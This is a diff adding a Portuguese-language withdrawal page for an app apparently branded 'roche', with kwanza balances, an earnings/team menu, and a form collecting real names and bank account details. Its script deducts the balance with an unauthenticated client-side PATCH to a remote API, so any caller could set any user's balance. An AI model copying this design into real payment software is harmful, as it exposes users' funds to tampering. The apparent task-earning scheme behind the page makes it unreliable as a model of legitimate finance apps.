@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html class="pixel-ratio-3 retina android android-5 android-5-0 watch-active-state">
+
+<head>
+    <meta -equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta -equiv="pragma" content="no-cache">
+    <meta -equiv="cache-control" content="no-cache">
+    <meta -equiv="expires" content="0">
+    <title>roche Saque</title>
+    <link rel="stylesheet" href="/static/home/css/app.css?v=5.8">
+    <link rel="stylesheet" href="/static/home/css/iconfont.css">
+    <script type="text/javascript" src="/static/home/js/jquery-1.11.3.min.js"></script>
+    <script type="text/javascript" src="/static/home/js/layer.js"></script>
+    <style type="text/css">
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(180deg, #ffae00, rgba(255, 215, 0, 0));
+            font-family: Arial, sans-serif;
+        }
+
+        .cz-index-top {
+            height: 120px;
+            margin-top: 65px;
+            background: linear-gradient(135deg, #ff7e00, #ff7e00);
+            margin-left: 4%;
+            margin-right: 4%;
+            border-radius: 10px;
+            padding: 15px;
+            color: #fff;
+            box-shadow: 0 3px 10px rgba(255, 126, 0, 0.2);
+        }
+
+        .tixianlog-index-top-title {
+            margin-top: 0.5rem;
+            font-size: 15px;
+            opacity: 0.9;
+        }
+
+        .tixianlog-index-top-mull {
+            height: 3rem;
+            line-height: 3rem;
+            text-align: left;
+            padding-left: 0.5rem;
+            font-size: 26px;
+            font-weight: bold;
+        }
+
+        .exchange {
+            margin-left: 4%;
+            margin-right: 4%;
+            background: #ffffff;
+            border-radius: 10px;
+            margin-top: 15px;
+            padding: 15px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .amount-input-container {
+            position: relative;
+            margin: 20px 0;
+            border-radius: 10px;
+            background: rgb(255, 255, 240);
+            overflow: hidden;
+            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.05);
+            border: 1px solid #ff7e00;
+        }
+
+        .amount-prefix {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 22px;
+            font-weight: bold;
+            color: #454a6b;
+            z-index: 2;
+        }
+
+        .amount-input {
+            width: 100%;
+            border: none;
+            height: 60px;
+            background: transparent;
+            padding: 10px 20px 10px 45px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff7e00;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .amount-input::placeholder {
+            font-size: 14px;
+        }
+
+        .amount-input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.5);
+        }
+
+        .Putforwardbtn {
+            height: 3rem;
+            margin-top: 1rem;
+        }
+
+        .Putforwardbtn button {
+            width: 100%;
+            height: 3.5rem;
+            appearance: none;
+            background: linear-gradient(90deg, #ff7e00, #ff7e00);
+            outline: none;
+            border: none;
+            border-radius: 25px;
+            font-size: 1.1rem;
+            color: #fff;
+            letter-spacing: 1px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        .Putforwardbtn button:active {
+            transform: scale(0.98);
+            box-shadow: 0 2px 8px rgba(255, 126, 0, 0.2);
+        }
+
+        .recharge-input {
+            width: 100%;
+            border: 1px solid #ff7e00;
+            height: 50px;
+            line-height: 50px;
+            display: inline-flex;
+            border-radius: 10px;
+            background: rgb(255, 255, 240);
+            margin-bottom: 15px;
+            overflow: hidden;
+        }
+
+        .recharge-input span {
+            color: #454a6b;
+            width: 35%;
+            padding-left: 15px;
+            height: 50px;
+            line-height: 50px;
+            text-align: left;
+            font-weight: 600;
+        }
+
+        .recharge-input input {
+            color: #ff7e00;
+            width: 65%;
+            height: 48px;
+            border: none;
+            background: transparent;
+            font-size: 16px;
+            padding-right: 15px;
+            text-align: right;
+        }
+
+        .wi-tips {
+            margin-left: 4%;
+            margin-right: 4%;
+            background: #ffffff;
+            text-align: left;
+            color: #39393d;
+            margin-top: 1rem;
+            margin-bottom: 70px;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .navbar {
+            position: absolute;
+            top: 0;
+            width: 100%;
+            line-height: 45px;
+            z-index: 20;
+            background: #ffae00;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .navbar .left {
+            width: auto;
+            height: 45px;
+            position: absolute;
+            left: 10px;
+            display: flex;
+            align-items: center;
+        }
+
+        .navbar .left a {
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+        }
+
+        .message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 15px 25px;
+            border-radius: 8px;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            font-size: 16px;
+            z-index: 1000;
+            display: none;
+        }
+
+        footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #fff;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding: 5px 0;
+            border-top: 1px solid #ddd;
+            z-index: 1000;
+        }
+
+        footer .foot_bo {
+            flex: 1;
+            text-align: center;
+        }
+
+        footer .foot_bo img {
+            width: 24px;
+            height: 24px;
+            display: block;
+            margin: 0 auto 4px;
+        }
+
+        footer .foot_bo p {
+            margin: 0;
+            font-size: 12px;
+            color: #333;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="views">
+        <div class="navbar theme-white">
+            <div class="navbar-inner">
+                <div class="left">
+                    <a href="home.html" class="external link">
+                        <img src="https://img.icons8.com/?size=60&id=60636&format=png" alt="Voltar" style="height: 24px; width: 24px;">
+                    </a>
+                </div>
+                <div class="center">Saque</div>
+            </div>
+        </div>
+        
+        <div class="navbar-fixed">
+            <div class="cz-index-top">
+                <p class="tixianlog-index-top-title">Saldo atual</p>
+                <p class="tixianlog-index-top-mull" id="currentBalance">AOA 0</p>
+            </div>
+            
+            <div class="exchange">
+                <div class="amount-input-container">
+                    <span class="amount-prefix">AOA</span>
+                    <input type="number" name="amount" id="withdrawalAmount" class="amount-input" placeholder="Quantidade de retirada">
+                </div>
+                <div class="recharge-input">
+                    <span>Nome real:</span>
+                    <input type="text" id="userName" placeholder="Digite seu nome completo">
+                </div>
+                <div class="recharge-input">
+                    <span>Conta:</span>
+                    <input type="text" id="userAccount" placeholder="Digite os dados da conta">
+                </div>
+                <div class="Putforwardbtn">
+                    <button type="button" id="withdrawButton" class="btn rechargeBtn">Retirar</button>
+                </div>
+            </div>
+            
+            <div class="wi-tips">
+                <p>Dica:</p>
+                <p>1. O valor mínimo de saque é de AOA1100</p>
+                <p><br/></p>
+                <p>2. Os saques estão disponíveis das 9h as 17h por dia</p>
+                <p><br/></p>
+                <p>3. Os saques geralmente chegam em 10 minutos a 3 horas</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="message" class="message"></div>
+
+    <footer>
+        <div class="foot_bo">
+            <a href="home.html">
+                <img src="https://roche-ec.cyou/static/home/img/dhl/0010.png" />
+                <p class="xz">Início</p>
+            </a>
+        </div>
+        <div class="foot_bo">
+            <a href="produto.html">
+                <img src="https://roche-ec.cyou/static/home/img/dhl/0012.png" />
+                <p>Ganhos</p>
+            </a>
+        </div>
+        <div class="foot_bo">
+            <a href="equipe.html">
+                <img src="https://roche-ec.cyou/static/home/img/dhl/0014.png" />
+                <p>Team</p>
+            </a>
+        </div>
+        <div class="foot_bo">
+            <a href="perfil.html">
+                <img src="https://roche-ec.cyou/static/home/img/dhl/0016.png" />
+                <p>Meu</p>
+            </a>
+        </div>
+    </footer>
+
+    <script>
+        // Variáveis globais
+        const MIN_WITHDRAWAL = 1100;
+        const WITHDRAWAL_START_HOUR = 9;
+        const WITHDRAWAL_END_HOUR = 17;
+        let userData = null;
+
+        // Elementos do DOM
+        const currentBalanceEl = document.getElementById('currentBalance');
+        const withdrawalAmountEl = document.getElementById('withdrawalAmount');
+        const userNameEl = document.getElementById('userName');
+        const userAccountEl = document.getElementById('userAccount');
+        const withdrawButtonEl = document.getElementById('withdrawButton');
+        const messageEl = document.getElementById('message');
+
+        // Funções auxiliares
+        function showMessage(text, duration = 3000) {
+            messageEl.textContent = text;
+            messageEl.style.display = 'block';
+            setTimeout(() => {
+                messageEl.style.display = 'none';
+            }, duration);
+        }
+
+        function isWithinWithdrawalHours() {
+            const now = new Date();
+            const hours = now.getHours();
+            return hours >= WITHDRAWAL_START_HOUR && hours < WITHDRAWAL_END_HOUR;
+        }
+
+        // Carregar dados do usuário
+        async function loadUserData() {
+            const userId = localStorage.getItem("user_id");
+            
+            if (!userId) {
+                showMessage("Usuário não identificado. Faça login novamente.");
+                return;
+            }
+
+            try {
+                const response = await fetch(`https://api-wped.onrender.com/user/${userId}`);
+                
+                if (!response.ok) {
+                    throw new Error("Erro ao carregar dados do usuário");
+                }
+                
+                userData = await response.json();
+                
+                // Atualizar o saldo na interface
+                currentBalanceEl.textContent = `AOA ${userData.saldo || 0}`;
+                
+            } catch (error) {
+                console.error("Erro ao carregar dados do usuário:", error);
+                showMessage("Erro ao carregar dados do usuário");
+            }
+        }
+
+        // Processar solicitação de saque
+        async function processWithdrawal() {
+            const amount = parseFloat(withdrawalAmountEl.value);
+            const name = userNameEl.value.trim();
+            const account = userAccountEl.value.trim();
+            
+            // Validações
+            if (isNaN(amount)) {
+
+                showMessage("Por favor, digite um valor válido");
+                return;
+            }
+
+            if (amount < MIN_WITHDRAWAL) {
+                showMessage(`O valor mínimo para saque é AOA ${MIN_WITHDRAWAL}`);
+                return;
+            }
+
+            if (amount > userData.saldo) {
+                showMessage("Saldo insuficiente para esta retirada");
+                return;
+            }
+
+            if (!isWithinWithdrawalHours()) {
+                showMessage(`Os saques só podem ser feitos entre ${WITHDRAWAL_START_HOUR}h e ${WITHDRAWAL_END_HOUR}h`);
+                return;
+            }
+
+            if (!name) {
+                showMessage("Por favor, digite seu nome completo");
+                return;
+            }
+
+            if (!account) {
+                showMessage("Por favor, digite os dados da conta");
+                return;
+            }
+
+            // Desabilitar o botão durante o processamento
+            withdrawButtonEl.disabled = true;
+            withdrawButtonEl.textContent = "Processando...";
+
+            try {
+                // 1. Atualizar o saldo do usuário
+                const updateResponse = await fetch(`https://api-wped.onrender.com/user/${userData.id}`, {
+                    method: 'PATCH',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        saldo: userData.saldo - amount
+                    })
+                });
+
+                if (!updateResponse.ok) {
+                    throw new Error("Erro ao atualizar saldo");
+                }
+
+                // 2. Registrar a solicitação de saque
+                const withdrawalData = {
+                    userId: userData.id,
+                    name: name,
+                    account: account,
+                    amount: amount,
+                    status: "pending",
+                    withdrawalTime: new Date().toISOString(),
+                    isWithdrawal: true,
+                    isDeposit: false,
+                    approved: false,
+                    processed: false
+                };
+
+                const withdrawalResponse = await fetch('https://api-wped.onrender.com/retirada', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(withdrawalData)
+                });
+
+                if (!withdrawalResponse.ok) {
+                    throw new Error("Erro ao registrar saque");
+                }
+
+                // Atualizar os dados locais
+                userData.saldo -= amount;
+                currentBalanceEl.textContent = `AOA ${userData.saldo}`;
+                withdrawalAmountEl.value = "";
+                userNameEl.value = "";
+                userAccountEl.value = "";
+                
+                showMessage("Solicitação de saque enviada com sucesso!");
+
+            } catch (error) {
+                console.error("Erro ao processar saque:", error);
+                showMessage("Erro ao processar saque. Tente novamente.");
+            } finally {
+                // Reabilitar o botão
+                withdrawButtonEl.disabled = false;
+                withdrawButtonEl.textContent = "Retirar";
+            }
+        }
+
+        // Event Listeners
+        document.addEventListener('DOMContentLoaded', loadUserData);
+        withdrawButtonEl.addEventListener('click', processWithdrawal);
+    </script>
+</body>
+</html>
